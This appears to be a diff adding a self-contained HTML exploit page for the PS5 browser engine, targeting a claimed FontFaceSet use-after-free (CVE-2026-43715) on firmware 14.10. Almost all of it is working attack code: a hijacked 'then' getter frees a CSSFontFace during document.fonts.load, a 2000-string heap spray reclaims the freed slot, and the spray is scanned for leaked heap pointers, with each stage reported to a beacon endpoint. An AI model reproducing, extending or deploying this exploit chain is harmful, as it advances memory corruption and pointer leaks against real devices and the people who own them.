@@ -1,0 +1,257 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="30;url=/"><title>V954</title>
+<style>body{background:#000;color:#0f0;font:11px monospace}#log{white-space:pre-wrap}</style></head><body>
+<div id="log"></div>
+<script>
+// V954 -- FontFaceSet Type Confusion on PS5 14.10
+// CVE-2026-43715: fontFaceSet::load() weak ref UAF
+// Based on lunarshe11 trigger (proven 14.00, external research)
+// CSSFontFace=192B on 14.10, spray=86-char UTF-16
+// Single UAF per page. No Canvas, no CallTracer risk.
+var PRE='V954',B=1,LOG=document.getElementById('log');
+function Lg(m){try{LOG.textContent+=m+'\n';}catch(e){}}
+function bea(tag,d){
+ var s=('000'+B).slice(-3);B++;
+ var path='/beacon/'+PRE+'-'+s+'-'+tag+'?d='+encodeURIComponent(String(d==null?'':d))+'&t='+Date.now();
+ Lg(s+' '+tag+' '+d);
+ try{navigator.sendBeacon(path);}catch(e){}
+ try{new Image().src=path;}catch(e){}
+ try{new Image().src=path+'&k=3';}catch(e){}
+}
+function hex8(v){return ('00000000'+(v>>>0).toString(16)).slice(-8);}
+function hex4(v){return ('0000'+(v>>>0).toString(16)).slice(-4);}
+
+// Death recovery pool
+var BI=1200;var pool=[];for(var i=0;i<BI;i++)pool.push(new Image());
+
+bea('BOOT','v954-fontfaceset-uaf-1410');
+
+// S1: API capability check
+var hasFontFace=typeof FontFace!=='undefined';
+var hasDocFonts=!!(document.fonts);
+var hasLoad=hasDocFonts&&typeof document.fonts.load==='function';
+var hasCheck=hasDocFonts&&typeof document.fonts.check==='function';
+var hasAdd=hasDocFonts&&typeof document.fonts.add==='function';
+bea('ENTER-S1','FF='+hasFontFace+'|DF='+hasDocFonts+'|load='+hasLoad+'|check='+hasCheck+'|add='+hasAdd);
+
+if(!hasFontFace||!hasLoad||!hasCheck||!hasAdd){
+ bea('FAIL-DEAD','missing-fontface-api');
+}else{
+ try{main();}catch(e){bea('FAIL-UNCAUGHT',String(e.message||e).slice(0,80));}
+}
+
+function main(){
+ // S2: Create @font-face 'x' via stylesheet (this CSSFontFace gets freed)
+ var style=document.createElement('style');
+ style.textContent="@font-face{font-family:'x';src:local('NONEXIST_V954_X');unicode-range:U+0042;}";
+ document.head.appendChild(style);
+ bea('PASS-S2','stylesheet-x-added');
+
+ // S3: Create JS FontFace 'a', add to document.fonts
+ // This one triggers thenable assimilation during load()
+ var ffA;
+ try{
+  ffA=new FontFace('a',"local('NONEXIST_V954_A')",{unicodeRange:'U+0041'});
+  document.fonts.add(ffA);
+  bea('PASS-S3','ff-a-added|status='+ffA.status);
+ }catch(e){
+  bea('FAIL-S3',String(e.message||e).slice(0,60));
+  return;
+ }
+
+ // S4: Baseline oracle -- check('1em x') should be true (stylesheet present)
+ var checkBefore='err';
+ try{checkBefore=document.fonts.check('1em x');}catch(e){}
+ var checkA='err';
+ try{checkA=document.fonts.check('1em a');}catch(e){}
+ bea('ENTER-S4','base-x='+checkBefore+'|base-a='+checkA);
+
+ // S5: Build spray template
+ // 86 UTF-16 chars = 20B header + 172B = 192B = CSSFontFace bucket
+ // Chars 54-57 (byte offset 128-135) = 0x0000 -> NULL critical pointer (safe)
+ // All other chars > 0xFF to force 16-bit encoding
+ var tpl=new Array(86);
+ for(var k=0;k<86;k++){
+  if(k>=54&&k<=57) tpl[k]=0;
+  else tpl[k]=0x0100+(k&0x3F);
+ }
+
+ // S6: Define then getter on FontFace.prototype (one-shot)
+ var thenFired=false;
+ var thenTarget='unknown';
+ var sprayStrings=[];
+
+ Object.defineProperty(FontFace.prototype,'then',{
+  get:function(){
+   if(thenFired)return undefined;
+   thenFired=true;
+   try{thenTarget=this.family||'?';}catch(e){thenTarget='err';}
+   bea('ENTER-S6','then-getter|target='+thenTarget);
+
+   // Remove stylesheet -> CSSFontFace for 'x' freed
+   try{
+    document.head.removeChild(style);
+    bea('PASS-S6A','style-removed');
+   }catch(e){
+    bea('FAIL-S6A',String(e.message||e).slice(0,50));
+   }
+
+   // Force layout to ensure CSSFontFace destruction
+   try{void document.body.offsetHeight;}catch(e){}
+
+   // Spray 2000x 192B strings to reclaim freed 192B slot
+   for(var i=0;i<2000;i++){
+    // Vary chars 0,1 for uniqueness (avoid dedup)
+    tpl[0]=0x0100+(i&0xFF);
+    tpl[1]=0x0100+((i>>8)&0x0F);
+    var s=String.fromCharCode.apply(null,tpl);
+    void s.charCodeAt(0); // force StringImpl alloc in fastMalloc
+    sprayStrings.push(s);
+   }
+   bea('PASS-S6B','spray='+sprayStrings.length+'|charLen='+sprayStrings[0].length);
+
+   return undefined;
+  },
+  configurable:true
+ });
+
+ bea('ENTER-S7','calling-load');
+
+ // S7: Trigger -- document.fonts.load('1em a, x', 'AB')
+ // load() finds matching CSSFontFaces via weak refs (reference_wrapper)
+ // For JS FontFace 'a': Promise.resolve(fontFace) -> thenable check -> our getter
+ // Getter frees CSSFontFace 'x' + sprays strings
+ // load() continues with stale ref to freed CSSFontFace 'x' -> UAF
+ var loadDone=false;
+
+ try{
+  document.fonts.load('1em a, x','AB').then(function(faces){
+   bea('PASS-S7','resolved|n='+(faces?faces.length:'null'));
+   postTrigger();
+  },function(err){
+   bea('FAIL-S7R','rejected|'+String(err).slice(0,50));
+   postTrigger();
+  });
+ }catch(e){
+  bea('FAIL-S7S',String(e.message||e).slice(0,60));
+  postTrigger();
+ }
+
+ // Fallback if promise never settles
+ setTimeout(function(){postTrigger();},5000);
+
+ function postTrigger(){
+  if(loadDone)return;
+  loadDone=true;
+
+  // Clean up then getter
+  try{delete FontFace.prototype.then;}catch(e){}
+
+  bea('ENTER-S8','thenFired='+thenFired+'|target='+thenTarget);
+
+  // S8: Oracle -- does engine still think font 'x' exists?
+  // If CSSFontFace slot reclaimed by our string, stale cache entry -> true
+  var checkAfter='err';
+  try{checkAfter=document.fonts.check('1em x');}catch(e){
+   bea('FAIL-S8',String(e.message||e).slice(0,50));
+  }
+  bea('PASS-S8','before='+checkBefore+'|after='+checkAfter);
+
+  // S9: Scan spray strings for modifications
+  // If engine writes through stale CSSFontFace pointer, string content changes
+  var modified=0;
+  var firstIdx=-1;
+
+  for(var i=0;i<sprayStrings.length;i++){
+   var s=sprayStrings[i];
+   if(!s||s.length!==86)continue;
+
+   // Expected values for invariant positions (chars 2-53, 58-85)
+   var isDiff=false;
+   var diffs=[];
+   for(var j=2;j<54;j++){
+    var exp=0x0100+(j&0x3F);
+    var got=s.charCodeAt(j);
+    if(got!==exp){
+     isDiff=true;
+     diffs.push(j+':'+hex4(got));
+     if(diffs.length>=8)break;
+    }
+   }
+   if(diffs.length<8){
+    for(var j=58;j<86;j++){
+     var exp=0x0100+(j&0x3F);
+     var got=s.charCodeAt(j);
+     if(got!==exp){
+      isDiff=true;
+      diffs.push(j+':'+hex4(got));
+      if(diffs.length>=8)break;
+     }
+    }
+   }
+   // Check NULL zone (chars 54-57) for writes
+   for(var j=54;j<=57;j++){
+    if(s.charCodeAt(j)!==0){
+     isDiff=true;
+     diffs.push(j+':'+hex4(s.charCodeAt(j)));
+    }
+   }
+
+   if(isDiff){
+    modified++;
+    if(firstIdx<0)firstIdx=i;
+    if(modified<=3){
+     // Extract heap pointers at CSSFontFace offsets
+     // +88 (m_wrapper): byte 88 = char (88-20)/2 = char 34, 4 chars wide
+     var lo88=(s.charCodeAt(34)|(s.charCodeAt(35)<<16))>>>0;
+     var hi88=(s.charCodeAt(36)|(s.charCodeAt(37)<<16))>>>0;
+     // +104 (m_clients): byte 104 = char (104-20)/2 = char 42, 4 chars wide
+     var lo104=(s.charCodeAt(42)|(s.charCodeAt(43)<<16))>>>0;
+     var hi104=(s.charCodeAt(44)|(s.charCodeAt(45)<<16))>>>0;
+     bea('PASS-S9','i='+i+'|p88='+hex8(hi88)+':'+hex8(lo88)+'|p104='+hex8(hi104)+':'+hex8(lo104)+'|d='+diffs.join(','));
+    }
+   }
+  }
+
+  bea('ENTER-S10','modified='+modified+'|firstIdx='+firstIdx);
+
+  // S10: Rendering test (only if oracle passed, safe NULL at offset 128)
+  var renderResult='skip';
+  if(checkAfter===true){
+   try{
+    var div=document.createElement('div');
+    div.style.fontFamily="'x', serif";
+    div.style.fontSize='48px';
+    div.textContent='B';
+    document.body.appendChild(div);
+    void div.offsetHeight;
+    var w=div.offsetWidth;
+    document.body.removeChild(div);
+    renderResult='ok|w='+w;
+   }catch(e){
+    renderResult='crash|'+String(e.message||e).slice(0,40);
+   }
+   bea('PASS-S10','render='+renderResult);
+  }
+
+  // VERDICT
+  var verdict='UNKNOWN';
+  if(checkAfter===true&&modified>0){
+   verdict='TYPE-CONFUSION-CONFIRMED+LEAK';
+  }else if(checkAfter===true){
+   verdict='TYPE-CONFUSION-CONFIRMED';
+  }else if(modified>0){
+   verdict='NO-ORACLE-BUT-LEAK';
+  }else if(thenFired&&checkAfter===false){
+   verdict='THEN-FIRED-NO-CONFUSION';
+  }else if(thenFired&&checkAfter==='err'){
+   verdict='THEN-FIRED-ORACLE-ERR';
+  }else if(!thenFired){
+   verdict='THEN-DEAD';
+  }else{
+   verdict='CLEAN-MISS';
+  }
+
+  bea('VERDICT',verdict+'|oracle='+checkAfter+'|mods='+modified+'|then='+thenFired+'|target='+thenTarget+'|render='+renderResult);
+ }
+}
+</script></body></html>
